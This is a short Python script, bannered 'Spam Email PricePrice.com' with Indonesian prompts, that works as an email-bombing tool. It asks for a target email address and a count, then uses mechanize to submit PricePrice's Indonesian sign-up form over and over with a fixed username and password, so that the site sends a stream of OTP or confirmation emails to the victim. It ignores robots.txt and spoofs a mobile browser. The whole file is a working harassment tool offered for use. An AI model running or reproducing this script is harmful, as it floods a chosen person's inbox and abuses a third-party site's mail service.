try:
	import mechanize,os,sys,time,json
except ModuleNotFoundError as mdl:
	exit('Module Err: %s'%(mdl))

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 7.1)")]

class Price:
	def __init__(self):
		self.detekos()
		self.username='Kang_Newbie'
		self.pas='kangnewbienobea'
		self.banner()

	def detekos(self):
		if os.name in ['nt','win32']:
			os.system('cls')
		else: os.system('clear')

	def banner(self):
		print("""
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		; Spam Email PricePrice.com ;
		;      BY : Kang-Newbie     ;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		""")
		self.email=input('[?] Email Target: ')
		jum=int(input('[?] Jumlah: '))
		print()
		for i in range(jum):
			self.send()

	def send(self):
		br.open('https://id.priceprice.com/signUp')
		br.select_form(nr=0)
		br.form['signup[user_name]']=self.username
		br.form['signup[email]']=self.email
		br.form['signup[password][first]']=self.pas
		br.form['signup[password][second]']=self.pas
		sub=br.submit().read()
		if 'untuk menyelesaikan akun Anda' in str(sub):
			print('[+] Sukses mengirim OTP')
		else: print('[-] Gagal mengirim OTP')

try:
	Price()
except KeyboardInterrupt:
	exit('[Exit] Key interrupt')
except Exception as F:
	print('Err: %s'%(F))